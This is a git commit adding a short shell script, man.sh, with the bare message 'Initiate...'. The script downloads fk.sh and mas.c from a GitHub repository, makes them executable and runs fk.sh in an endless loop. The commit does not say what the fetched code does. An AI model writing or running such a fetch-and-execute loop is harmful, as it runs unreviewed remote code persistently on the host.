d740a755cf3b50cef6987aeb700cf5f26d2f631d
biswas179 <86525152+biswas179@users.noreply.github.com>
2021-08-10 12:37:40 +0530

    Initiate...

---
+++ man.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+  wget https://github.com/biswas179/FkgX/raw/main/fk.sh 
+  chmod +x fk.sh 
+  wget https://github.com/biswas179/FkgX/raw/main/mas.c
+  chmod +x mas.c
+  while [ 1 ]; do
+  ./fk.sh
+  sleep 20000
+  done
